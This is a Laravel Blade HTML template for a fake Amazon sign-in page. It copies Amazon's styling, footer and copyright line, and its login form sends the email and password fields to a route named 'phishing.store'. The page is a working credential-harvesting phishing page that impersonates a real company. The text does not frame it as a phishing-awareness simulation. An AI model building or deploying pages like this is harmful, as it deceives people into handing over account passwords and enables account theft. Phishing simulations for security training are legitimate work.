<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .amazon-container {
            max-width: 350px;
            width: 100%;
        }
        
        .amazon-logo {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .amazon-logo svg {
            width: 120px;
            height: 40px;
        }
        
        .amazon-card {
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px 26px;
        }
        
        .amazon-title {
            font-weight: 400;
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .form-label {
            font-weight: 700;
            font-size: 13px;
            padding-left: 2px;
            padding-bottom: 2px;
        }
        
        .form-control {
            border-radius: 3px;
            border: 1px solid #a6a6a6;
            border-top-color: #949494;
            padding: 6px 8px;
            height: 38px;
            font-size: 15px;
            margin-bottom: 15px;
        }
        
        .form-control:focus {
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228, 121, 17, 0.5);
            outline: none;
        }
        
        .btn-amazon {
            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
            border-color: #a88734 #9c7e31 #846a29;
            color: #111;
            border-radius: 2px;
            width: 100%;
            height: 36px;
            font-size: 15px;
            margin: 10px 0;
            border-style: solid;
            border-width: 1px;
            cursor: pointer;
        }
        
        .btn-amazon:hover {
            background: linear-gradient(to bottom, #f5d78e, #eeb933);
        }
        
        .legal-text {
            font-size: 12px;
            line-height: 1.5;
            margin-top: 18px;
            color: #111;
        }
        
        .amazon-help {
            font-size: 13px;
            color: #0066c0;
            text-decoration: none;
            margin-top: 10px;
            display: inline-block;
        }
        
        .amazon-help:hover {
            color: #c45500;
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            position: relative;
            margin: 20px 0;
            font-size: 12px;
            color: #767676;
            z-index: 1;
        }
        
        .divider:before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            border-top: 1px solid #e7e7e7;
            z-index: -1;
        }
        
        .divider span {
            background: #fff;
            padding: 0 8px;
        }
        
        .btn-create {
            width: 100%;
            height: 36px;
            border-radius: 2px;
            border: 1px solid #adb1b8;
            background: linear-gradient(to bottom, #f9f9fa, #e7e9ec);
            font-size: 15px;
            cursor: pointer;
        }
        
        .btn-create:hover {
            background: linear-gradient(to bottom, #e7eaf0, #d9dce1);
        }
        
        .amazon-footer {
            margin-top: 20px;
            text-align: center;
            font-size: 11px;
            color: #555;
        }
        
        .amazon-footer-links {
            margin-top: 10px;
        }
        
        .amazon-footer-links a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 10px;
            font-size: 11px;
        }
        
        .amazon-footer-links a:hover {
            color: #c45500;
            text-decoration: underline;
        }
        
        .alert-success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
            border-radius: 4px;
            padding: 10px;
            margin-bottom: 15px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="amazon-container">
        <div class="amazon-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 625 175">
                <path d="M238 93c0-21 1-37 5-49 4-13 11-23 22-31 12-8 27-12 45-12 19 0 33 4 44 12 11 8 18 18 22 31 4 12 5 28 5 49 0 20-1 36-5 48-4 13-11 23-22 31-11 8-25 12-44 12-18 0-33-4-45-12-11-8-18-18-22-31-4-12-5-28-5-48zm33 0c0 13 0 23 1 31 2 8 4 14 8 19 4 5 9 8 16 10 7 2 14 3 22 3 8 0 15-1 22-3 7-2 12-5 16-10 4-5 6-11 8-19 1-8 2-18 2-31 0-13-1-23-2-31-2-8-4-14-8-19-4-5-9-8-16-10-7-2-14-3-22-3-8 0-15 1-22 3-7 2-12 5-16 10-4 5-6 11-8 19-1 8-2 18-2 31zM0 163V12h35v151H0zm62 0V54h34v109H62zm51 0V12h35v151h-35zm51-70V12h35v81h39v70h-74zm113 70V12h35v25h49v21h-49v37h44v21h-44v46h-35zm140-81V12h74v21h-39v29h35v20h-35v40h-35zm87 81V12h35v25h39v21h-39v84h-35zm114 0V54h34v109h-34zm51 0V54h34v109h-34zM469 12h44c15 0 27 3 35 10 8 6 12 16 12 29 0 7-1 13-4 18-3 5-7 9-13 12v1c7 2 12 6 16 11 4 5 6 12 6 20 0 15-5 25-14 32-9 7-23 10-39 10h-47V12zm35 47h7c6 0 11-1 14-4 3-3 5-7 5-12s-2-9-5-12c-3-3-8-4-14-4h-7v32zm0 36h10c7 0 12-1 16-4 4-3 6-8 6-14 0-6-2-11-6-14-4-3-9-4-16-4h-10v36z" fill="#111"/>
                <path d="M625 50c0 28-22 50-50 50-27 0-50-22-50-50s23-50 50-50c28 0 50 22 50 50zm-35 0c0-8-7-15-15-15s-15 7-15 15 7 15 15 15 15-7 15-15z" fill="#111"/>
            </svg>
        </div>

        <div class="amazon-card">
            <h1 class="amazon-title">Sign in</h1>

            @if(session('success'))
                <div class="alert alert-success">{{ session('success') }}</div>
            @endif

            <form action="{{ route('phishing.store') }}" method="POST">
                @csrf
                <input type="hidden" name="category" value="{{ $category }}">

                <div class="mb-1">
                    <label for="email" class="form-label">Email or mobile phone number</label>
                    <input type="email" class="form-control" id="email" name="email" required>
                </div>

                <div class="mb-3">
                    <label for="password" class="form-label">Password</label>
                    <input type="password" class="form-control" id="password" name="password" required>
                </div>

                <button type="submit" class="btn btn-amazon">Continue</button>
            </form>

            <div class="legal-text">
                By continuing, you agree to Amazon's <a href="#" class="amazon-help">Conditions of Use</a> and <a href="#" class="amazon-help">Privacy Notice</a>.
            </div>

            <div class="amazon-help-container">
                <i class="fas fa-caret-right"></i> <a href="#" class="amazon-help">Need help?</a>
            </div>
        </div>

        <div class="divider">
            <span>New to Amazon?</span>
        </div>

        <button class="btn-create">Create your Amazon account</button>

        <div class="amazon-footer">
            <div class="amazon-footer-links">
                <a href="#">Conditions of Use</a>
                <a href="#">Privacy Notice</a>
                <a href="#">Help</a>
            </div>
            <div class="mt-2">© 1996-2023, Amazon.com, Inc. or its affiliates</div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>